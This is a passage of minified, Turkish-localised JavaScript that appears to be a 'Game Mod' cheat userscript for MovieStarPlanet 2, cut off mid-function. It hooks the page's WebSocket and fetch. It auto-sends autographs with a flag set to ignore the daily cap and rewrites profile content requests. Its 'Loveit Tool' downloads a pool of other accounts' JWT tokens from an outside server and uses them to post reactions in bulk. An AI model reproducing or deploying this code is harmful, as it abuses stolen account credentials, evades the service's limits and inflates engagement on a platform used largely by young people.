                    return Xt(Zt, e) && "string" == typeof t && ('42["chatv2:send",{"message":"Otoimza"}]' === t || '42["chatv2:send",{"message":"Otoimza"}]' === t || t.includes('"message":"autogreet"') || t.includes('"message":"a​u​t​o​g​r​e​e​t"')) && e.handleAutogreetCommand(), s.apply(this, arguments)
                }, r
            }, Object.assign(window.WebSocket, t)
        }
        async handleAutogreetCommand() {
            const t = await this.promptUsername();
            if (!t) return;
            const e = i.getToken();
            if (!e) return void this.showNotification("Not logged in", !1);
            const n = i.getUserData(e);
            if (!n?.name) return void this.showNotification("Could not get user data", !1);
            const o = n.name.split("|")[0],
                r = await this.findProfileId(t, o);
            r ? (Ht(oe, this, r), this.startGreeting()) : this.showNotification(`Could not find user ${t}`, !1)
        }
        handleMessage(t, e) {
            !e.startsWith('40{"jwt":"') && e.match(/^\d+$/)
        }
        promptUsername() {
            return new Promise((t => {
                const e = prompt("İmza vermek istediğiniz kullanıcı adını yazın.:");
                t(e?.trim() || null)
            }))
        }
        async findProfileId(t, e) {
            try {
                const n = await fetch("https://eu.mspapis.com/edgerelationships/graphql/graphql", {
                        method: "POST",
                        headers: Xt(ee, this).getHeaders(i.getToken()),
                        body: JSON.stringify({
                            query: "query GetProfileSearch($region: String!, $startsWith: String!, $pageSize: Int, $currentPage: Int, $preferredGameId: String!) { findProfiles(region: $region, nameBeginsWith: $startsWith, pageSize: $pageSize, page: $currentPage) { totalCount nodes { id avatar(preferredGameId: $preferredGameId) { gameId face full } } } }",
                            variables: JSON.stringify({
                                region: e,
                                startsWith: t,
                                pageSize: 50,
                                currentPage: 1,
                                preferredGameId: "j68d"
                            })
                        })
                    }),
                    o = await n.json();
                return o?.data?.findProfiles?.nodes?. [0]?.id || null
            } catch (t) {
                return null
            }
        }
        async sendGreeting() {
            if (Xt(oe, this)) try {
                const t = await fetch("https://eu.mspapis.com/federationgateway/graphql", {
                        method: "POST",
                        headers: Xt(ee, this).getHeaders(i.getToken()),
                        body: JSON.stringify({
                            id: "SendGreetings-159BDD7706D824BB8F14874A7FAE3368",
                            variables: {
                                greetingType: "Autograph",
                                receiverProfileId: Xt(oe, this),
                                ignoreDailyCap: !0
                            }
                        })
                    }),
                    e = await t.json(),
                    n = e?.data?.greetings?.sendGreeting?.success;
                if (!n) return Xt(te, this).track("sent-greeting-failed"), void this.showNotification("İmza gönderilmedi!", !1);
                Xt(te, this).track("sent-greeting"), this.showNotification("İmza gönderildi", !0)
            } catch (t) {
                Xt(te, this).track("sent-greeting-failed"), this.showNotification("Bir hata oluştu", !1)
            }
        }
        startGreeting() {
            Xt(re, this) && clearInterval(Xt(re, this)), this.sendGreeting(), Ht(re, this, setInterval((() => this.sendGreeting()), 125e3))
        }
        stopGreeting() {
            Xt(re, this) && (clearInterval(Xt(re, this)), Ht(re, this, null)), Ht(oe, this, null)
        }
        toggle() {
            Ht(Zt, this, !Xt(Zt, this)), Xt(Zt, this) || this.stopGreeting(), Xt(te, this).track("Greetings Service " + (Xt(Zt, this) ? "Enabled" : "Disabled"))
        }
        restore() {
            this.stopGreeting(), window.WebSocket = Xt(ne, this), window.fetch = Xt(ie, this)
        }
    }

    function ae(t, e, n) {
        ce(t, e), e.set(t, n)
    }

    function ce(t, e) {
        if (e.has(t)) throw new TypeError("Aynı özel öğeler bir nesne üzerinde iki kez başlatılamaz")
    }

    function he(t, e) {
        return t.get(ue(t, e))
    }

    function de(t, e, n) {
        return t.set(ue(t, e), n), n
    }

    function ue(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var le = new WeakMap,
        pe = new WeakMap,
        we = new WeakMap,
        fe = new WeakMap,
        me = new WeakMap,
        ge = new WeakSet;
    class be {
        constructor() {
            var t;
            ce(this, t = ge), t.add(this), ae(this, le, !0), ae(this, pe, void 0), ae(this, we, void 0), ae(this, fe, void 0), ae(this, me, /^https:\/\/[^/]+\/profilegeneratedcontent\/v2\/profiles\/[^/]+\/games\/j68d\/content$/), de(pe, this, f.getInstance()), de(we, this, T.getInstance()), de(fe, this, window.fetch), this.initialize()
        }
        initialize() {
            var t = this;
            window.fetch = async function () {
                for (var e = arguments.length, n = new Array(e), o = 0; o < e; o++) n[o] = arguments[o];
                const [r, s] = n;
                if (!he(le, t) || "string" != typeof r || !he(me, t).test(r)) return he(fe, t).apply(window, n);
                try {
                    const e = "string" == typeof s?.body ? s.body : await (s?.body?.text?.());
                    if (e?.includes("WAYD")) {
                        const e = i.getToken();
                        if (!e) return he(fe, t).apply(window, n);
                        const o = i.getUserData(e)?.profileId;
                        if (!o) return he(fe, t).apply(window, n);
                        const a = await ue(ge, t, ye).call(t, o, e);
                        if (!a) return he(fe, t).apply(window, n);
                        he(pe, t).track("UGC WAYD Request Modified");
                        const c = `https://${ue(ge,t,ve).call(t,e)}${new URL(r).pathname}/${a}`;
                        return he(fe, t).call(window, c, {
                            ...s,
                            method: "PUT"
                        })
                    }
                } catch (t) {}
                return he(fe, t).apply(window, n)
            }
        }
        toggle() {
            de(le, this, !he(le, this))
        }
        restore() {
            de(le, this, !1), window.fetch = he(fe, this)
        }
    }

    function ve(t) {
        if (!t) return "eu.mspapis.com";
        const e = i.getUserData(t);
        return "US" === e?.name?.split("|")[0] ? "us.mspapis.com" : "eu.mspapis.com"
    }
    async function ye(t, e) {
        if (!he(le, this)) return null;
        try {
            const n = ue(ge, this, ve).call(this, e),
                i = await he(fe, this).call(this, `https://${n}/profileattributes/v1/profiles/${t}/games/j68d/attributes`, {
                    headers: he(we, this).getHeaders(e)
                }),
                o = await i.json();
            return o?.additionalData?.WAYD || null
        } catch (t) {
            return null
        }
    }

    function xe(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function ke(t, e) {
        return t.get(Me(t, e))
    }

    function Se(t, e, n) {
        return t.set(Me(t, e), n), n
    }

    function Me(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var We = new WeakMap,
        je = new WeakMap,
        Te = new WeakMap,
        ze = new WeakMap,
        Ee = new WeakMap,
        Oe = new WeakMap,
        Ce = new WeakMap,
        Pe = new WeakMap;
    class $e {
        constructor() {
            if (xe(this, We, void 0), xe(this, je, void 0), xe(this, Te, new Map), xe(this, ze, !0), xe(this, Ee, !1), xe(this, Oe, JSON.parse(localStorage.getItem("modMenuPosition") || '{"x": 20, "y": 20}')), xe(this, Ce, null), xe(this, Pe, null), Ie.t) return Ie.t;
            Ie.t = this, Se(We, this, f.getInstance()), "loading" === document.readyState ? document.addEventListener("DOMContentLoaded", (() => this.initialize())) : this.initialize()
        }
        static getInstance() {
            return Ie.t ?? new $e
        }
        registerService(t, e) {
            let n = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : "",
                i = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : "";
            return "Emote Service" === t ? (Se(Ce, this, e), void this.updateMenu()) : "Loveits Service" === t ? (Se(Pe, this, e), e.setMenuUpdateCallback((() => this.updateMenu())), void this.updateMenu()) : (ke(Te, this).set(t, {
                service: e,
                enabled: !0,
                description: n,
                shortcut: i
            }), void this.updateMenu())
        }
        initialize() {
            this.createStyles(), this.createMenu(), this.setupKeyboardShortcut()
        }
        createStyles() {
            const t = document.createElement("style");
            t.textContent = "\n            .mod-menu {\n                position: fixed;\n                background: rgba(17, 17, 27, 0.95);\n                border-radius: 12px;\n                padding: 12px;\n                font-family: 'Inter', system-ui, -apple-system, sans-serif;\n                color: #cdd6f4;\n                width: 300px;\n                backdrop-filter: blur(10px);\n                border: 1px solid rgba(255, 255, 255, 0.1);\n                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);\n                z-index: 999999;\n                transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);\n                max-height: 90vh;\n                overflow: hidden;\n                scrollbar-width: thin;\n                scrollbar-color: rgba(205, 214, 244, 0.2) transparent;\n                zoom: 80%;\n            }\n\n            .mod-menu.minimized {\n                max-height: 42px;\n            }\n\n            .mod-menu.minimized .mod-menu-content {\n                opacity: 0;\n                transform: translateY(-10px);\n                pointer-events: none;\n            }\n\n            .mod-menu-content {\n                transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);\n                opacity: 1;\n                transform: translateY(0);\n                overflow-y: auto;\n                max-height: calc(90vh - 42px);\n            }\n\n            .mod-menu::-webkit-scrollbar {\n                width: 4px;\n            }\n\n            .mod-menu::-webkit-scrollbar-track {\n                background: transparent;\n            }\n\n            .mod-menu::-webkit-scrollbar-thumb {\n                background-color: rgba(205, 214, 244, 0.2);\n                border-radius: 2px;\n            }\n\n            .mod-menu-header {\n                display: flex;\n                justify-content: space-between;\n                align-items: center;\n                margin-bottom: 12px;\n                padding-bottom: 8px;\n                border-bottom: 1px solid rgba(205, 214, 244, 0.1);\n                cursor: move;\n                user-select: none;\n                height: 22px;\n            }\n\n            .mod-menu.minimized .mod-menu-header {\n                margin-bottom: 0;\n                padding-bottom: 0;\n                border-bottom: none;\n            }\n\n            .mod-menu-title {\n                font-size: 18px;\n                font-weight: 600;\n                background: linear-gradient(135deg, #cdd6f4 0%, #c5b522 100%);\n                -webkit-background-clip: text;\n                -webkit-text-fill-color: transparent;\n                letter-spacing: -0.3px;\n            }\n\n            .mod-menu-controls {\n                display: flex;\n                gap: 6px;\n            }\n\n            .mod-menu-button {\n                background: rgba(69, 71, 90, 0.5);\n                border: none;\n                color: #cdd6f4;\n                width: 24px;\n                height: 24px;\n                border-radius: 6px;\n                cursor: pointer;\n                display: flex;\n                align-items: center;\n                justify-content: center;\n                font-size: 16px;\n                transition: all 0.2s ease;\n            }\n\n            .mod-menu-button:hover {\n                background: rgba(88, 91, 112, 0.7);\n                transform: scale(1.05);\n            }\n\n            .mod-menu-service {\n                background: rgba(49, 50, 68, 0.3);\n                border-radius: 8px;\n                padding: 10px;\n                margin-bottom: 8px;\n                transition: all 0.2s ease;\n            }\n\n            .mod-menu-service:hover {\n                background: rgba(49, 50, 68, 0.5);\n            }\n\n            .service-header {\n                display: flex;\n                justify-content: space-between;\n                align-items: center;\n                margin-bottom: 4px;\n            }\n\n            .service-name {\n                font-weight: 500;\n                font-size: 14px;\n                color: #cdd6f4;\n            }\n\n            .service-shortcut {\n                font-size: 11px;\n                color: #6c7086;\n                background: rgba(108, 112, 134, 0.2);\n                padding: 2px 6px;\n                border-radius: 4px;\n            }\n\n            .service-description {\n                font-size: 12px;\n                color: #a6adc8;\n                margin-bottom: 6px;\n                line-height: 1.3;\n            }\n\n            .service-toggle {\n                position: relative;\n                display: inline-block;\n                width: 36px;\n                height: 20px;\n            }\n\n            .service-toggle input {\n                opacity: 0;\n                width: 0;\n                height: 0;\n            }\n\n            .service-toggle-slider {\n                position: absolute;\n                cursor: pointer;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background-color: rgba(127, 132, 156, 0.4);\n                transition: .3s;\n                border-radius: 34px;\n            }\n\n            .service-toggle-slider:before {\n                position: absolute;\n                content: \"\";\n                height: 16px;\n                width: 16px;\n                left: 2px;\n                bottom: 2px;\n                background-color: #cdd6f4;\n                transition: .3s;\n                border-radius: 50%;\n            }\n\n            .service-toggle input:checked + .service-toggle-slider {\n                background-color: #078a00;\n            }\n\n            .service-toggle input:checked + .service-toggle-slider:before {\n                transform: translateX(16px);\n            }\n\n            .emotes-section {\n                margin-top: 16px;\n                padding: 16px;\n                background: linear-gradient(135deg, rgba(49, 50, 68, 0.4) 0%, rgba(49, 50, 68, 0.2) 100%);\n                border-radius: 12px;\n                border: 1px solid rgba(137, 180, 250, 0.1);\n                box-shadow: 0 4px 24px -8px rgba(0, 0, 0, 0.3);\n                backdrop-filter: blur(8px);\n                position: relative;\n                overflow: hidden;\n            }\n\n            .emotes-section::before {\n                content: \"\";\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                height: 1px;\n                background: linear-gradient(90deg, \n                    transparent 0%, \n                    rgba(137, 180, 250, 0.2) 50%, \n                    transparent 100%\n                );\n            }\n\n            .emotes-title {\n                font-size: 16px;\n                font-weight: 600;\n                color: #cdd6f4;\n                margin-bottom: 16px;\n                display: flex;\n                align-items: center;\n                gap: 8px;\n            }\n\n            .emotes-title::after {\n                content: \"\";\n                flex: 1;\n                height: 1px;\n                background: linear-gradient(90deg, \n                    rgba(205, 214, 244, 0.1) 0%, \n                    transparent 100%\n                );\n            }\n\n            .emote-select {\n                width: 100%;\n                padding: 10px 14px;\n                background: rgba(49, 50, 68, 0.6);\n                border: 1px solid rgba(137, 180, 250, 0.2);\n                border-radius: 10px;\n                color: #cdd6f4;\n                font-size: 14px;\n                appearance: none;\n                cursor: pointer;\n                transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);\n                margin-bottom: 16px;\n                box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);\n                background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24' fill='none' stroke='rgba(205, 214, 244, 0.5)' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E\");\n                background-repeat: no-repeat;\n                background-position: right 10px center;\n                background-size: 16px;\n                padding-right: 40px;\n            }\n\n            .emote-select:hover {\n                background-color: rgba(49, 50, 68, 0.8);\n                border-color: rgba(137, 180, 250, 0.3);\n                transform: translateY(-1px);\n            }\n\n            .emote-select:focus {\n                outline: none;\n                border-color: rgba(137, 180, 250, 0.5);\n                box-shadow: 0 0 0 3px rgba(137, 180, 250, 0.15);\n                transform: translateY(-1px);\n            }\n\n            .emote-select option {\n                background-color: #1e1e2e;\n                color: #cdd6f4;\n                padding: 10px;\n            }\n\n            .emote-toggle-button {\n                width: 100%;\n                padding: 10px 16px;\n                background: #18cf00;\n                border: none;\n                border-radius: 10px;\n                color: #1e1e2e;\n                font-size: 14px;\n                font-weight: 600;\n                cursor: pointer;\n                transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);\n                position: relative;\n                overflow: hidden;\n                text-shadow: 0 1px 0 rgba(255, 255, 255, 0.2);\n                box-shadow: 0 2px 8px rgba(74, 222, 128, 0.2),\n                           0 4px 24px rgba(0, 0, 0, 0.1);\n            }\n\n            .emote-toggle-button:hover {\n                background: #09b000;\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(74, 222, 128, 0.3),\n                           0 8px 32px rgba(0, 0, 0, 0.15);\n            }\n\n            .emote-toggle-button.disabled {\n                background: #c70000;\n                color: #e5e7eb;\n                transform: none;\n                box-shadow: 0 2px 8px rgba(107, 114, 128, 0.2);\n            }\n\n            .emote-toggle-button.disabled:hover {\n                background: #910000;\n                box-shadow: 0 4px 12px rgba(107, 114, 128, 0.3);\n            }\n\n            .emote-toggle-button::before {\n                content: \"\";\n                position: absolute;\n                top: 0;\n                left: 0;\n                width: 100%;\n                height: 100%;\n                background: linear-gradient(45deg, \n                    rgba(255, 255, 255, 0.1), \n                    rgba(255, 255, 255, 0)\n                );\n                transform: translateX(-100%) skewX(-15deg);\n                transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1);\n            }\n\n            .emote-toggle-button:not(.disabled):hover::before {\n                transform: translateX(100%) skewX(-15deg);\n            }\n\n            .loveits-section {\n                margin-top: 16px;\n                padding: 16px;\n                background: linear-gradient(135deg, rgba(244, 114, 182, 0.2) 0%, rgba(244, 114, 182, 0.1) 100%);\n                border-radius: 12px;\n                border: 1px solid rgba(244, 114, 182, 0.2);\n                box-shadow: 0 4px 24px -8px rgba(0, 0, 0, 0.3);\n            }\n\n            .loveits-title {\n                font-size: 16px;\n                font-weight: 600;\n                color: #cdd6f4;\n                margin-bottom: 12px;\n                display: flex;\n                align-items: center;\n                gap: 8px;\n            }\n\n            .loveits-stats {\n                display: grid;\n                grid-template-columns: repeat(2, 1fr);\n                gap: 8px;\n                margin-bottom: 12px;\n            }\n\n            .loveits-stat {\n                background: rgba(49, 50, 68, 0.4);\n                padding: 8px;\n                border-radius: 8px;\n                text-align: center;\n            }\n\n            .loveits-stat-value {\n                font-size: 18px;\n                font-weight: 600;\n                color: #cdd6f4;\n            }\n\n            .loveits-stat-label {\n                font-size: 12px;\n                color: #a6adc8;\n            }\n\n            .loveits-button {\n                width: 100%;\n                padding: 10px;\n                background: rgb(244, 114, 182);\n                border: none;\n                border-radius: 8px;\n                color: white;\n                font-weight: 600;\n                cursor: pointer;\n                transition: all 0.2s ease;\n            }\n\n            .loveits-button:hover {\n                background: rgb(219, 39, 119);\n            }\n\n            .loveits-button:disabled {\n                background: #6b7280;\n                cursor: not-allowed;\n            }\n\n            .discord-section {\n                margin-top: 16px;\n                padding: 16px;\n                background: linear-gradient(135deg, rgba(88, 101, 242, 0.2) 0%, rgba(88, 101, 242, 0.1) 100%);\n                border-radius: 12px;\n                border: 1px solid rgba(88, 101, 242, 0.2);\n                box-shadow: 0 4px 24px -8px rgba(0, 0, 0, 0.3);\n            }\n\n            .discord-title {\n                font-size: 16px;\n                font-weight: 600;\n                color: #cdd6f4;\n                margin-bottom: 12px;\n                display: flex;\n                align-items: center;\n                gap: 8px;\n            }\n\n            .discord-button {\n                display: inline-flex;\n                align-items: center;\n                justify-content: center;\n                gap: 8px;\n                width: 100%;\n                padding: 12px 16px;\n                background: #5865F2;\n                border: none;\n                border-radius: 10px;\n                color: white;\n                font-size: 14px;\n                font-weight: 600;\n                cursor: pointer;\n                transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);\n                text-decoration: none;\n                box-sizing: border-box;\n            }\n\n            .discord-button:hover {\n                background: #4752C4;\n                transform: translateY(-2px);\n                box-shadow: 0 4px 12px rgba(88, 101, 242, 0.3);\n            }\n\n            @keyframes slideIn {\n                from {\n                    opacity: 0;\n                    transform: translateY(-10px);\n                }\n                to {\n                    opacity: 1;\n                    transform: translateY(0);\n                }\n            }\n\n            .mod-menu.hidden {\n                opacity: 0;\n                pointer-events: none;\n                transform: scale(0.95);\n            }\n        ", document.head.appendChild(t);
            const e = document.createElement("link");
            e.href = "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap", e.rel = "stylesheet", document.head.appendChild(e)
        }
        createMenu() {
            Se(je, this, document.createElement("div")), ke(je, this).className = "mod-menu", ke(je, this).style.left = `${ke(Oe,this).x}px`, ke(je, this).style.top = `${ke(Oe,this).y}px`;
            const t = document.createElement("div");
            t.className = "mod-menu-header";
            const e = document.createElement("div");
            e.className = "mod-menu-title", e.textContent = "Game Mod";
            const n = document.createElement("div");
            n.className = "mod-menu-controls";
            const i = document.createElement("button");
            i.className = "mod-menu-button", i.innerHTML = ke(Ee, this) ? "+" : "−", i.onclick = () => this.toggleMinimize(), n.appendChild(i), t.appendChild(e), t.appendChild(n), ke(je, this).appendChild(t);
            let o, r, s, a, c = !1;
            t.addEventListener("mousedown", (t => {
                c = !0, s = t.clientX - ke(Oe, this).x, a = t.clientY - ke(Oe, this).y, ke(je, this).style.transition = "none"
            })), document.addEventListener("mousemove", (t => {
                c && (t.preventDefault(), o = t.clientX - s, r = t.clientY - a, ke(Oe, this).x = o, ke(Oe, this).y = r, ke(je, this).style.left = `${o}px`, ke(je, this).style.top = `${r}px`, localStorage.setItem("modMenuPosition", JSON.stringify(ke(Oe, this))))
            })), document.addEventListener("mouseup", (() => {
                c = !1, ke(je, this).style.transition = "all 0.3s cubic-bezier(0.16, 1, 0.3, 1)"
            })), document.body.appendChild(ke(je, this)), this.updateMenu()
        }
        setupKeyboardShortcut() {
            document.addEventListener("keydown", (t => {
                t.altKey && "m" === t.key && (t.preventDefault(), this.toggleVisibility())
            }))
        }
        toggleMinimize() {
            Se(Ee, this, !ke(Ee, this)), ke(je, this).classList.toggle("minimized", ke(Ee, this)), ke(je, this).querySelector(".mod-menu-button").innerHTML = ke(Ee, this) ? "+" : "−", ke(We, this).track("Mod Menu Minimized", {
                minimized: ke(Ee, this)
            })
        }
        toggleVisibility() {
            Se(ze, this, !ke(ze, this)), ke(je, this).classList.toggle("hidden", !ke(ze, this)), ke(We, this).track("Mod Menu Toggled", {
                visible: ke(ze, this)
            })
        }
        updateMenu() {
            const t = document.createElement("div");
            t.className = "mod-menu-content";
            const e = document.createElement("div");
            if (e.className = "mod-menu-services", ke(Te, this).forEach(((t, n) => {
                    const i = document.createElement("div");
                    i.className = "mod-menu-service", i.style.animation = "slideIn 0.3s ease forwards";
                    const o = document.createElement("div");
                    o.className = "service-header";
                    const r = document.createElement("div");
                    r.style.display = "flex", r.style.alignItems = "center", r.style.gap = "6px";
                    const s = document.createElement("div");
                    if (s.className = "service-name", s.textContent = n, r.appendChild(s), t.shortcut) {
                        const e = document.createElement("div");
                        e.className = "service-shortcut", e.textContent = t.shortcut, r.appendChild(e)
                    }
                    const a = document.createElement("label");
                    a.className = "service-toggle";
                    const c = document.createElement("input");
                    c.type = "checkbox", c.checked = t.enabled, c.onchange = () => {
                        t.enabled = c.checked, t.service.toggle && t.service.toggle(), ke(We, this).track("Service Toggled", {
                            service: n,
                            enabled: t.enabled
                        })
                    };
                    const h = document.createElement("span");
                    if (h.className = "service-toggle-slider", a.appendChild(c), a.appendChild(h), o.appendChild(r), o.appendChild(a), i.appendChild(o), t.description) {
                        const e = document.createElement("div");
                        e.className = "service-description", e.textContent = t.description, i.appendChild(e)
                    }
                    e.appendChild(i)
                })), t.appendChild(e), ke(Ce, this)) {
                const e = document.createElement("div");
                e.className = "emotes-section";
                const n = document.createElement("div");
                n.className = "emotes-title", n.textContent = "Ruh Hali seç";
                const i = document.createElement("select");
                i.className = "emote-select", ke(Ce, this).getEmotes().forEach((t => {
                    const e = document.createElement("option");
                    e.value = t, e.textContent = ke(Ce, this).formatEmoteName(t), e.selected = t === ke(Ce, this).getCurrentEmote(), i.appendChild(e)
                })), i.addEventListener("change", (t => {
                    ke(Ce, this).setCurrentEmote(t.target.value), ke(We, this).track("Emote Changed", {
                        emote: t.target.value
                    })
                }));
                const o = document.createElement("button");
                o.className = "emote-toggle-button", o.textContent = "Etkinleştir/Devre Dışı Bırak", o.classList.toggle("disabled", !ke(Ce, this).isEnabled), o.onclick = () => {
                    ke(Ce, this).toggle(), o.classList.toggle("disabled"), ke(We, this).track("Emote Service Toggled")
                }, e.appendChild(n), e.appendChild(i), e.appendChild(o), t.appendChild(e)
            }
            if (ke(Pe, this)) {
                const e = ke(Pe, this).getStats(),
                    n = document.createElement("div");
                n.className = "loveits-section";
                const o = document.createElement("div");
                o.className = "loveits-title", o.innerHTML = "Loveit Tool";
                const r = document.createElement("div");
                r.className = "loveits-stats", [{
                    label: "Başarlı",
                    value: e.success
                }, {
                    label: "Başarsız",
                    value: e.failed
                }, {
                    label: "Toplam",
                    value: e.total
                }, {
                    label: "Token",
                    value: e.tokens
                }].forEach((t => {
                    const e = document.createElement("div");
                    e.className = "loveits-stat", e.innerHTML = `\n                    <div class="loveits-stat-value">${t.value}</div>\n                    <div class="loveits-stat-label">${t.label}</div>\n                `, r.appendChild(e)
                }));
                const s = document.createElement("button");
                s.className = "loveits-button", s.textContent = e.isProcessing ? "Yürütülüyor..." : "Gönder", s.disabled = e.isProcessing, s.onclick = () => {
                    const t = i.getToken();
                    if (t) {
                        const e = i.getUserData(t);
                        e?.profileId && (ke(Pe, this).processCreations(e.profileId), this.updateMenu())
                    }
                }, n.appendChild(o), n.appendChild(r), n.appendChild(s), t.appendChild(n)
            }
            const n = document.createElement("div");
            n.className = "discord-section";
            const o = document.createElement("div");
            o.className = "discord-title", o.textContent = "Discord";
            const r = document.createElement("a");
            for (r.href = "https://discord.gg/FyYDpzHeTg", r.className = "discord-button", r.target = "_blank", r.textContent = "Katıl", r.onclick = () => {
                    ke(We, this).track("Discord Link Clicked")
                }, n.appendChild(o), n.appendChild(r), t.appendChild(n); ke(je, this).children.length > 1;) ke(je, this).removeChild(ke(je, this).lastChild);
            ke(je, this).appendChild(t)
        }
    }
    var Ie = {
        t: void 0
    };

    function _e(t, e, n) {
        (function (t, e) {
            if (e.has(t)) throw new TypeError("Cannot initialize the same private elements twice on an object")
        })(t, e), e.set(t, n)
    }

    function Ae(t, e) {
        return t.get(Je(t, e))
    }

    function Ne(t, e, n) {
        return t.set(Je(t, e), n), n
    }

    function Je(t, e, n) {
        if ("function" == typeof t ? t === e : t.has(e)) return arguments.length < 3 ? e : n;
        throw new TypeError("Private element is not present on this object")
    }
    var qe = new WeakMap,
        De = new WeakMap,
        Ue = new WeakMap,
        Le = new WeakMap,
        Re = new WeakMap,
        Ge = new WeakMap,
        Qe = new WeakMap,
        Be = new WeakMap,
        Ye = new WeakMap,
        Fe = new WeakMap,
        Ke = new WeakMap,
        Xe = new WeakMap;
    class He {
        constructor() {
            _e(this, qe, !0), _e(this, De, void 0), _e(this, Ue, void 0), _e(this, Le, []), _e(this, Re, {
                success: 0,
                failed: 0,
                total: 0
            }), _e(this, Ge, !1), _e(this, Qe, null), _e(this, Be, !1), _e(this, Ye, null), _e(this, Fe, 3e3), _e(this, Ke, 5), _e(this, Xe, 100), Ne(De, this, f.getInstance()), Ne(Ue, this, T.getInstance()), this.initialize()
        }
        initialize() {
            this.loadTokens()
        }
        setMenuUpdateCallback(t) {
            Ne(Qe, this, t)
        }
        async loadTokens() {
            try {
                const t = await fetch("https://loveit.msp2.lol/alltokens"),
                    e = await t.json();
                Ne(Le, this, e.tokens.map((t => t.jwt))), Ae(De, this).track("Loveits tokens loaded", {
                    count: Ae(Le, this).length
                })
            } catch (t) {}
        }
        getStats() {
            return {
                ...Ae(Re, this),
                tokens: Ae(Le, this).length,
                isProcessing: Ae(Ge, this)
            }
        }
        parseJWT(t) {
            try {
                const e = t.split(".")[1].replace(/-/g, "+").replace(/_/g, "/"),
                    n = decodeURIComponent(atob(e).split("").map((t => "%" + ("00" + t.charCodeAt(0).toString(16)).slice(-2))).join(""));
                return JSON.parse(n)
            } catch (t) {
                return null
            }
        }
        async fetchWithTimeout(t, e) {
            const n = new AbortController,
                i = setTimeout((() => n.abort()), Ae(Fe, this));
            try {
                return await fetch(t, {
                    ...e,
                    signal: n.signal
                })
            } finally {
                clearTimeout(i)
            }
        }
        async getUserCreations(t, e) {
            if (Ae(Be, this)) throw new Error("Operation cancelled");
            try {
                const n = i.getToken();
                if (!n) throw new Error("No authentication token found");
                const o = await this.fetchWithTimeout("https://eu.mspapis.com/edgeugc/graphql", {
                        method: "POST",
                        headers: {
                            ...Ae(Ue, this).getHeaders(n)
                        },
                        body: JSON.stringify({
                            query: "query GetUserUGCs($gameId: String!, $profileId: String!, $contentType: String, $page: String, $pageSize: Int) {\n                        recentUgcsByProfile(input:{gameId: $gameId, profileId: $profileId, contentType: $contentType, page: $page, pageSize: $pageSize}) {\n                            nextPage entries {id title lastEditedDate lifecycleStatus owner type commentCount privacyStatus reactions {reactionTypeId count} resources {type id} profile {id name membership {lastTierExpiry} avatar(preferredGameId: $gameId) {face full}}}\n                        }\n                    }",
                            variables: JSON.stringify({
                                gameId: "j68d",
                                profileId: t,
                                contentType: e,
                                page: "",
                                pageSize: 50
                            })
                        })
                    }),
                    r = await o.json();
                return r?.data?.recentUgcsByProfile?.entries?.map((t => t.id)) || []
            } catch (t) {
                if ("AbortError" === t.name) throw new Error("Operation cancelled or timed out");
                return []
            }
        }
        async getWaydId(t) {
            if (Ae(Be, this)) throw new Error("Operation cancelled");
            try {
                const e = i.getToken();
                if (!e) throw new Error("No authentication token found");
                const n = await this.fetchWithTimeout(`https://eu.mspapis.com/profileattributes/v1/profiles/${t}/games/j68d/attributes`, {
                        headers: Ae(Ue, this).getHeaders(e)
                    }),
                    o = await n.json();
                return o?.additionalData?.WAYD || null
            } catch (t) {
                if ("AbortError" === t.name) throw new Error("Operation cancelled or timed out");
                return null
            }
        }
        async sendLoveit(t, e) {
            if (Ae(Be, this)) throw new Error("Operation cancelled");
            try {
                const n = this.parseJWT(e);
                return !!n?.profileId && (await this.fetchWithTimeout(`https://eu.mspapis.com/profilereactions/v1/profiles/${n.profileId}/reactions/sources/profilegeneratedcontent/entities/${t}`, {
                    method: "POST",
                    headers: {
                        Authorization: `Bearer ${e}`,
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        reactionTypeId: "loveit",
                        entityGameId: "j68d"
                    })
                })).ok
            } catch (t) {
                if ("AbortError" === t.name) throw new Error("Operation cancelled or timed out");
                return !1
            }
        }
        stopProcessing() {
            Ae(Ge, this) && (Ne(Be, this, !0), Ae(Ye, this)?.abort(), Ne(Ye, this, null), Ae(Qe, this)?.call(this))
        }
        shuffleArray(t) {
            for (let e = t.length - 1; e > 0; e--) {
                const n = Math.floor(Math.random() * (e + 1));
                [t[e], t[n]] = [t[n], t[e]]
            }
            return t
        }
        async processBatch(t) {
            return Promise.all(t.map((async t => {
                let {
                    creationId: e,
                    token: n
                } = t;
                try {
                    return {
                        success: await this.sendLoveit(e, n),
                        error: null
                    }
                } catch (t) {
                    return {
                        success: !1,
                        error: t
                    }
                }
            })))
        }
        async processCreations(t) {
            if (Ae(Ge, this)) return;
            let e;
            Ne(Ge, this, !0), Ne(Be, this, !1), Ne(Ye, this, new AbortController), Ne(Re, this, {
                success: 0,
                failed: 0,
                total: 0
            }), Ae(Qe, this)?.call(this);
            try {
                const n = await this.getUserCreations(t, "Looks");
                if (Ae(Be, this)) throw new Error("Operation cancelled");
                const i = await this.getWaydId(t);
                if (Ae(Be, this)) throw new Error("Operation cancelled");
                const o = [...n];
                i && o.push(i);
                const r = [];
                for (const t of o)
                    for (const e of Ae(Le, this)) r.push({
